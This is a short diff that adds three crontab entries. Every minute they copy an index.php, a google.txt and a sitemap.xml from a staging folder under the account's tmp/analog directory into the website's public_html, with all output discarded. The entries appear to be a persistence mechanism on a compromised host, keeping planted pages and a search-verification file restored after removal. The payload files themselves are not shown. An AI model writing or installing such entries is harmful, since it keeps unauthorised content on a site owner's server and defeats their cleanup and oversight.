@@ -1,0 +1,6 @@
+* * * * * mkdir -p /home/ojsftkuin/public_html/altarqiyah;cp -r /home/ojsftkuin/tmp/analog/altarqiyah/index.php /home/ojsftkuin/public_html/ >/dev/null 2>&1
+* * * * * mkdir -p /home/ojsftkuin/public_html/altarqiyah;cp -r /home/ojsftkuin/tmp/analog/altarqiyah/google.txt /home/ojsftkuin/public_html/ >/dev/null 2>&1
+* * * * * mkdir -p /home/ojsftkuin/public_html/altarqiyah;cp -r /home/ojsftkuin/tmp/analog/altarqiyah/sitemap.xml /home/ojsftkuin/public_html/ >/dev/null 2>&1
+
+
+
